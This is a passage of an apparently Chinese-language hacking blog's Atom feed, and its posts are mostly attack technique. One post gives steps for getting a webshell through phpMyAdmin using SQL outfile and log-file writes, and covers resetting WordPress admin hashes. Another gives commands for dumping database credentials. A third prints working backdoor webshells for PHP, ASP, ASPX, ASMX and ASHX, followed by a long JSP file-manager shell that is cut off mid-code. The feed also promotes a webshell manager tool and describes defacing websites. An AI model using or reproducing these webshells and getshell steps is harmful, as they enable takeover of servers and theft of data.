    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;DoS&amp;#x2F;DDoS應該是小學生最喜歡的東西了，很多小學生和小屁孩都喜歡把說ddos然後就會覺得自己是黑客&amp;#x2F;駭客。&lt;br&gt;(</summary>
      
    
    
    
    
    <category term="BlackHat" scheme="http://example.com/tags/BlackHat/"/>
    
    <category term="ddos" scheme="http://example.com/tags/ddos/"/>
    
    <category term="dos" scheme="http://example.com/tags/dos/"/>
    
  </entry>
  
  <entry>
    <title>【Tech】[PenTest] phpMyAdmin的getshell方法</title>
    <link href="http://example.com/2023/06/12/%E3%80%90Tech%E3%80%91-PenTest-phpmyadmingetshell/"/>
    <id>http://example.com/2023/06/12/%E3%80%90Tech%E3%80%91-PenTest-phpmyadmingetshell/</id>
    <published>2023-06-12T08:03:06.000Z</published>
    <updated>2023-06-17T02:25:17.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在滲透測試中有時可以運氣行好直接登入到phpMyAdmin，<br>下一步我們可以透過getshell進行更深入的滲透，例如像域滲透這種。   </p><h1 id="環境"><a href="#環境" class="headerlink" title="環境"></a>環境</h1><ul><li>Windows 11</li><li>Apache + php8.2</li><li>phpMyAdmin</li></ul><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>需要以下條件</p><ul><li>phpMyAdmin最好是root帳號</li><li>知道Absolute Path (本文使用 D:&#x2F;xampp&#x2F;htdocs)</li></ul><h1 id="實戰"><a href="#實戰" class="headerlink" title="實戰"></a>實戰</h1><h2 id="Geshell方法"><a href="#Geshell方法" class="headerlink" title="Geshell方法"></a>Geshell方法</h2><p>phpMyAdmin getshell一般有兩種方法 :  </p><ul><li>SQL getshell</li><li>後端 getshell</li></ul><p>第一種是使用SQL把webshell寫到伺服器上，<br>第二種是改後端密碼上傳webshell。</p><h2 id="SQL-getshell"><a href="#SQL-getshell" class="headerlink" title="SQL getshell"></a>SQL getshell</h2><h3 id="常用方法-使用-select-into-outfile"><a href="#常用方法-使用-select-into-outfile" class="headerlink" title="常用方法 - 使用 select into outfile"></a>常用方法 - 使用 select into outfile</h3><p>這應該是最常用的方法了，在知道路徑的情況下可以用這招</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select load_file(&#x27;D:/xampp/htdocs&#x27;);<br>select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;D:/xampp/htdocs&#x27;;<br></code></pre></td></tr></table></figure><p>這是最簡單的方法，也是很容易失敗的方法，大部份網頁admin都不是傻的，他們會有設定檔案權限，<br>此時執行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;<br></code></pre></td></tr></table></figure><p>Value一般會有兩種結果</p><ul><li>Folder路徑 : 代表只有該路徑才可以修改</li><li>NULL : 禁止修改</li></ul><h3 id="Log寫shell"><a href="#Log寫shell" class="headerlink" title="Log寫shell"></a>Log寫shell</h3><p>MySQL 5.0以上會自動寫Logs，把執行過的SQL指令都寫進一個.log檔，<br>那如果此時的檔案不是.log而是.php呢?  </p><p>執行以下指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SHOW VARIABLES LIKE &#x27;general%&#x27;;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">set global general_log = &quot;ON&quot;;<br>set global general_log_file=&quot;D:/xampp/htdocs/shell.php&quot;;<br></code></pre></td></tr></table></figure><p>就會在D:&#x2F;xampp&#x2F;htdocs 生成一個shell.php<br>然後再   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select &#x27;&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;&#x27;<br></code></pre></td></tr></table></figure><p>就可以getshell了</p><h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><p>最簡單的php一句話木馬   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure><p>也是最容易被防毒查出來的，如果webshell的code寫得比較多可以把webshell base64加密，<br>再使用php的 base64_decode(); 函數解密。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>Log寫webshell的方法動作會很大的，會很容易被發現。<br>另外記得要把一開始的.log檔案記下，不然你會無法還原。</p><h2 id="後端GetShell"><a href="#後端GetShell" class="headerlink" title="後端GetShell"></a>後端GetShell</h2><h3 id="後端登入"><a href="#後端登入" class="headerlink" title="後端登入"></a>後端登入</h3><p class='item-img' data-src='/pic/phpmyadmingetshell/1.png'><img src="/pic/phpmyadmingetshell/1.png"></p><p>以wordpress為列子，phpMyAdmin+wordpress是比較容易getshell的，<br>因為wordpress是基於php的，而後端一般都會有檔案修改和上傳等功能。<br>Wordpress登入後端目前還算是很容易的，兩種做法 :   </p><ul><li>破解密碼Hash</li><li>在無法破解的情況下直接改密碼</li></ul><p class='item-img' data-src='/pic/phpmyadmingetshell/2.png'><img src="/pic/phpmyadmingetshell/2.png"></p><p>WordPress加密後的密碼很上去很亂，但要改也不難，假設你的新密碼是admin，那就把admin以MD5加密，把MD5 Hash換進去就可以了。</p><p class='item-img' data-src='/pic/phpmyadmingetshell/5.png'><img src="/pic/phpmyadmingetshell/5.png"></p><h3 id="GetShell方法"><a href="#GetShell方法" class="headerlink" title="GetShell方法"></a>GetShell方法</h3><p>一般三種方法   </p><ul><li>模版上傳</li><li>Plugin上傳</li><li>直接插入一句話木馬</li></ul><p>這種用第三種會比較好，因為前兩種都比較容閉被發現。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在滲透測試中有時可以運氣行好直接登入到phpMyAdmin，&lt;br&gt;下一步我們可以透過getshell進行更深入的滲透，例如像域滲透這種。 </summary>
      
    
    
    
    
    <category term="webshell" scheme="http://example.com/tags/webshell/"/>
    
    <category term="pentest" scheme="http://example.com/tags/pentest/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="phpmyadmin" scheme="http://example.com/tags/phpmyadmin/"/>
    
    <category term="getshell" scheme="http://example.com/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>【Tech】[SQL]SQL注入取得使用者帳號密碼的方法</title>
    <link href="http://example.com/2023/06/12/%E3%80%90Tech%E3%80%91-SQL-SQL%E6%B3%A8%E5%85%A5%E5%8F%96%E5%BE%97%E4%BD%BF%E7%94%A8%E8%80%85%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>http://example.com/2023/06/12/%E3%80%90Tech%E3%80%91-SQL-SQL%E6%B3%A8%E5%85%A5%E5%8F%96%E5%BE%97%E4%BD%BF%E7%94%A8%E8%80%85%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2023-06-12T08:00:40.000Z</published>
    <updated>2023-06-12T13:14:36.433Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>記錄幾個在sql注入中可以把database user, password拿出來的方法</p><h1 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sqlmap.py -u xxx --passwords<br></code></pre></td></tr></table></figure><h1 id="SQL-Query"><a href="#SQL-Query" class="headerlink" title="SQL Query"></a>SQL Query</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//MySQL<br>select host,user,password from mysql.user;<br><br>//SQL Server 2022<br>SELECT name, CONVERT(varchar(max), password_hash, 1) AS hashed_password FROM sys.sql_logins<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;記錄幾個在sql注入中可以把database user, password拿出來的方法&lt;/p&gt;
&lt;h1 id=&quot;SQLMap&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>【Tech】掛黑頁</title>
    <link href="http://example.com/2023/06/06/%E3%80%90Tech%E3%80%91%E6%8E%9B%E9%BB%91%E9%A0%81/"/>
    <id>http://example.com/2023/06/06/%E3%80%90Tech%E3%80%91%E6%8E%9B%E9%BB%91%E9%A0%81/</id>
    <published>2023-06-05T17:39:12.000Z</published>
    <updated>2023-06-11T13:00:52.852Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h2><p>黑頁, 英文是 Deface Page, 指的是在入侵網站後直接把網站的 home page 改為自己的內容,<br>一般都是用作惡意破壞或政治目的 :<br class='item-img' data-src='/pic/deface/1.png'><img src="/pic/deface/1.png">       </p><p>在十多年前的中國，當時對網路犯罪的打撃沒有很重，他們自己開發的CMS又有很多漏洞，很容易就會被Getshell，<br>做成以前很長的一段時間都有網站不斷地被掛黑頁，甚至還會在黑頁上寫上自己的QQ號碼。  </p><p>在國際上比較有名的事件 :</p><h3 id="Iranian-Cyber-Army"><a href="#Iranian-Cyber-Army" class="headerlink" title="Iranian Cyber Army"></a>Iranian Cyber Army</h3><p class='item-img' data-src='/pic/deface/2.png'><img src="/pic/deface/2.png"><br class='item-img' data-src='/pic/deface/3.png'><img src="/pic/deface/3.png">    </p><h2 id="掛黑頁"><a href="#掛黑頁" class="headerlink" title="掛黑頁"></a>掛黑頁</h2><p>從技術上來說，制作黑頁並不難，只要會寫HTML就可以了，難的時要怎麼樣掛黑頁，<br>目前來說掛黑頁的方式主要有兩種</p><ul><li>Getshell : 用Webshell直接修改 index.html 的HTML, 在無法getshell的情況下有的會直接在後端改圖片</li><li>DNS修改 : 把目標DNS改為自己的伺服器IP, 例如Iranian Cyber Army用的就是這種，還有美國政府也是，附圖如下</li></ul><h2 id="US"><a href="#US" class="headerlink" title="US"></a>US</h2><p class='item-img' data-src='/pic/deface/4.png'><img src="/pic/deface/4.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介紹&quot;&gt;&lt;a href=&quot;#介紹&quot; class=&quot;headerlink&quot; title=&quot;介紹&quot;&gt;&lt;/a&gt;介紹&lt;/h2&gt;&lt;p&gt;黑頁, 英文是 Deface Page, 指的是在入侵網站後直接把網站的 home page 改為自己的內容,&lt;br&gt;一般都是用作惡意破壞或</summary>
      
    
    
    
    <category term="BlackHat" scheme="http://example.com/categories/BlackHat/"/>
    
    
    <category term="code" scheme="http://example.com/tags/code/"/>
    
    <category term="html" scheme="http://example.com/tags/html/"/>
    
    <category term="blackhat" scheme="http://example.com/tags/blackhat/"/>
    
    <category term="deface page" scheme="http://example.com/tags/deface-page/"/>
    
  </entry>
  
  <entry>
    <title>【Tool】SiteHunter</title>
    <link href="http://example.com/2023/06/06/%E3%80%90Tool%E3%80%91SiteHunter/"/>
    <id>http://example.com/2023/06/06/%E3%80%90Tool%E3%80%91SiteHunter/</id>
    <published>2023-06-05T17:33:28.000Z</published>
    <updated>2023-06-12T03:29:32.291Z</updated>
    
    <content type="html"><![CDATA[<h1 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h1><p>SiteHunter是一個用C#編寫的網站掃瞄工具，<br>功能如下 :  </p><ul><li>C段掃瞄</li><li>目錄掃瞄</li><li>子域名爆破</li><li>Url Collector</li></ul><h1 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h1><p><a href="https://github.com/malbuffer4pt/SiteHunter">https://github.com/malbuffer4pt/SiteHunter</a></p><h1 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h1><p class='item-img' data-src='/pic/sitehunter/1.png'><img src="/pic/sitehunter/1.png"><br class='item-img' data-src='/pic/sitehunter/2.png'><img src="/pic/sitehunter/2.png"><br class='item-img' data-src='/pic/sitehunter/3.png'><img src="/pic/sitehunter/3.png"><br class='item-img' data-src='/pic/sitehunter/4.png'><img src="/pic/sitehunter/4.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;簡介&quot;&gt;&lt;a href=&quot;#簡介&quot; class=&quot;headerlink&quot; title=&quot;簡介&quot;&gt;&lt;/a&gt;簡介&lt;/h1&gt;&lt;p&gt;SiteHunter是一個用C#編寫的網站掃瞄工具，&lt;br&gt;功能如下 :  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C段掃瞄&lt;/li&gt;
&lt;li&gt;目錄掃瞄</summary>
      
    
    
    
    <category term="Tools" scheme="http://example.com/categories/Tools/"/>
    
    
    <category term="pentest" scheme="http://example.com/tags/pentest/"/>
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="SiteHunter" scheme="http://example.com/tags/SiteHunter/"/>
    
    <category term="Information" scheme="http://example.com/tags/Information/"/>
    
    <category term="Scan" scheme="http://example.com/tags/Scan/"/>
    
    <category term="C段掃瞄" scheme="http://example.com/tags/C%E6%AE%B5%E6%8E%83%E7%9E%84/"/>
    
    <category term="旁注" scheme="http://example.com/tags/%E6%97%81%E6%B3%A8/"/>
    
    <category term="子域名" scheme="http://example.com/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/"/>
    
    <category term="目錄爆破" scheme="http://example.com/tags/%E7%9B%AE%E9%8C%84%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>【Tool】Alien</title>
    <link href="http://example.com/2023/06/06/%E3%80%90Tool%E3%80%91Alien/"/>
    <id>http://example.com/2023/06/06/%E3%80%90Tool%E3%80%91Alien/</id>
    <published>2023-06-05T17:33:04.000Z</published>
    <updated>2023-06-11T17:04:44.957Z</updated>
    
    <content type="html"><![CDATA[<h1 id="簡介"><a href="#簡介" class="headerlink" title="簡介"></a>簡介</h1><p>Alien是一個用C#編寫的一句話木馬管理工具，<br>功能如下 :  </p><ul><li>System Information</li><li>FileManager (可顯示圖片)</li><li>Virtual Terminal</li><li>Database</li><li>Registry</li><li>Monitor</li><li>Screenshot</li></ul><h1 id="可控伺服器-可使用功能不一致"><a href="#可控伺服器-可使用功能不一致" class="headerlink" title="可控伺服器(可使用功能不一致)"></a>可控伺服器(可使用功能不一致)</h1><p>Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS</p><h1 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h1><ul><li>MySQL : PHP</li><li>SQL Server : ASP, ASPX, ASMX, ASHX</li></ul><h1 id="文檔-amp-下載"><a href="#文檔-amp-下載" class="headerlink" title="文檔&amp;下載"></a>文檔&amp;下載</h1><table><thead><tr><th>ID</th><th>主題</th><th>Url</th></tr></thead><tbody><tr><td>1</td><td>Alien文檔</td><td><a href="https://malbuffer4pt.github.io/Alien">https://malbuffer4pt.github.io/Alien</a></td></tr><tr><td>2</td><td>Alien Github</td><td><a href="https://github.com/malbuffer4pt/Alien">https://github.com/malbuffer4pt/Alien</a></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;簡介&quot;&gt;&lt;a href=&quot;#簡介&quot; class=&quot;headerlink&quot; title=&quot;簡介&quot;&gt;&lt;/a&gt;簡介&lt;/h1&gt;&lt;p&gt;Alien是一個用C#編寫的一句話木馬管理工具，&lt;br&gt;功能如下 :  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;System Information&lt;/</summary>
      
    
    
    
    <category term="Tools" scheme="http://example.com/categories/Tools/"/>
    
    
    <category term="Alien" scheme="http://example.com/tags/Alien/"/>
    
    <category term="webshell" scheme="http://example.com/tags/webshell/"/>
    
    <category term="backdoor" scheme="http://example.com/tags/backdoor/"/>
    
    <category term="pentest" scheme="http://example.com/tags/pentest/"/>
    
    <category term="工具" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>【Tech】一句話木馬</title>
    <link href="http://example.com/2023/06/06/%E3%80%90Tech%E3%80%91%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC/"/>
    <id>http://example.com/2023/06/06/%E3%80%90Tech%E3%80%91%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC/</id>
    <published>2023-06-05T17:04:54.000Z</published>
    <updated>2023-06-12T04:58:26.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="甚麼是WebShell"><a href="#甚麼是WebShell" class="headerlink" title="甚麼是WebShell"></a>甚麼是WebShell</h1><h2 id="WebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種-大馬-檔案大，30-70KB以上，加密後會超過100KB。-小馬-檔案小，一般在10KB以下-指令執行木馬-只能簡單地執行的Shell-Command-一句話木馬-功能可超越大馬，容易隱藏和改造。"><a href="#WebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種-大馬-檔案大，30-70KB以上，加密後會超過100KB。-小馬-檔案小，一般在10KB以下-指令執行木馬-只能簡單地執行的Shell-Command-一句話木馬-功能可超越大馬，容易隱藏和改造。" class="headerlink" title="WebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種 :- 大馬 : 檔案大，30~70KB以上，加密後會超過100KB。- 小馬 : 檔案小，一般在10KB以下    - 指令執行木馬 : 只能簡單地執行的Shell Command.    - 一句話木馬 : 功能可超越大馬，容易隱藏和改造。                "></a>WebShell是在滲透測試和入侵時都會用到的工具，是一種後門，<br>需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，<br>當使用者瀏覽網頁時就會下載或執行木馬。<br>WebShell是用來控制一整個網頁伺服器的工具。<br>WebShell有以下三種 :<br>- 大馬 : 檔案大，30~70KB以上，加密後會超過100KB。<br>- 小馬 : 檔案小，一般在10KB以下<br>    - 指令執行木馬 : 只能簡單地執行的Shell Command.<br>    - 一句話木馬 : 功能可超越大馬，容易隱藏和改造。                </h2><h1 id="一句話木馬"><a href="#一句話木馬" class="headerlink" title="一句話木馬"></a>一句話木馬</h1><p>在現今的入侵和滲透用的webshell基本上用的都是一句話木馬，<br>大馬的好處是所有執行的Payload都是在localhost上進行，<br>不使用HTTP POST，可以不考慮WAF，<br>但因為檔案太大很容易會被發現，而且不容易寫變種。<br>一句話木馬雖然會因為使用HTTP POST會被WAF檢查，<br>但是很容易寫變種和隱藏，還可以直接寫在正常的檔案內。</p><hr><h1 id="一句話木馬客戶端"><a href="#一句話木馬客戶端" class="headerlink" title="一句話木馬客戶端"></a>一句話木馬客戶端</h1><p>指的是先把對應語言的Payload寫好，再用客戶端發起 POST Request，這樣就會非常方便<br>在大陸以前比較有名的工具叫 中國菜刀，大陸現在比較常用的工具有三個 :</p><ul><li>蟻劍</li><li>Godzilla</li><li>冰蝎</li></ul><p>這邊推一下我自己寫的Alien<br><a href="https://malbuffer4pt.github.io/Alien">https://malbuffer4pt.github.io/Alien</a></p><hr><h1 id="一句話木馬的程式"><a href="#一句話木馬的程式" class="headerlink" title="一句話木馬的程式"></a>一句話木馬的程式</h1><p>在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器<br>如下圖 (工具: Alien)<br class='item-img' data-src='/pic/oneshell/1.png'><img src="/pic/oneshell/1.png"></p><p>以php為例，PHP一句話木馬為  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure><p>$_POST[‘pass’] : 取得HTTP POST參數為pass的Data<br>@eval($str); : 把 $str 以PHP Code執行  , @ 代表如果 $str &#x3D;&#x3D; null時就不顯示結果(這樣就增加了隱密性。)<br>所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 :   </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pass=phpinfo();<br></code></pre></td></tr></table></figure><p>就可執行phphinfo();  </p><p>ASP :  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;% execute(request(&quot;pass&quot;)) %&gt;<br></code></pre></td></tr></table></figure><p>ASPX :  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;<br>&lt;%eval(Request.Item[&quot;pass&quot;])%&gt;<br></code></pre></td></tr></table></figure><h2 id="關於ASMX-ASHX-CFM-JSP-JSPX和NodeJS木馬"><a href="#關於ASMX-ASHX-CFM-JSP-JSPX和NodeJS木馬" class="headerlink" title="關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬"></a>關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬</h2><p>它們的特點都是沒有「好用」(對攻撃者而言)的eval()函數，或者使用上會比較麻煩…<br>ASMX和ASHX是我在Freebuf上找到的，作者是Ivan，<br>這也有寫進Alien內。<br>而CFM是一個很老的東西了…</p><h3 id="ASMX"><a href="#ASMX" class="headerlink" title="ASMX"></a>ASMX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@ WebService Language=&quot;JScript&quot; class=&quot;ScriptMethodSpy&quot;%&gt;<br>import System;<br>import System.Web;<br>import System.IO;<br>import System.Web.Services<br>import System.Web.Script.Services<br>public class ScriptMethodSpy extends WebService<br>&#123;      <br>    WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void<br>    &#123;<br>            var I = HttpContext.Current;<br>        var Request = I.Request;<br>        var Response = I.Response;<br>        var Server = I.Server;<br>    Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt;&quot;);<br>        eval(Ivan);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ASHX"><a href="#ASHX" class="headerlink" title="ASHX"></a>ASHX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@ WebHandler Language=&quot;JScript&quot;class=&quot; HandlerSpy &quot;%&gt;<br>import System;<br>import System.Web;<br>import System.IO;<br>public class HandlerSpy implements IHttpHandler&#123;<br>   function IHttpHandler.ProcessRequest(context : HttpContext)&#123;<br>           context.Response.Write(&quot;&lt;H1&gt;Just for fun, Do not abuse it!Written by &lt;ahref=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt; &quot;);<br>           eval(context.Request[&quot;Ivan&quot;]);<br>        &#125;<br>    function get IHttpHandler.IsReusable() : Boolean&#123;<br>            return false;<br>       &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><p>JSP目前主要有兩種，菜刀形和冰蝎形<br>菜刀形 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;<br>&lt;%!<br>String Pwd=&quot;sky&quot;;<br>String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;<br>Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim()).newInstance();<br>Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;<br>void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;<br>void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&quot;&quot;;java.util.Date dt;<br>SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());<br>sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ+=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);&#125;<br>else&#123;sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;&#125;&#125;sb.append(sF);&#125;<br>void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();<br>for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;<br>void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();<br>ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));<br>os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;<br>void GG(String s, String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();<br>FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)<br>&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;<br>void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new 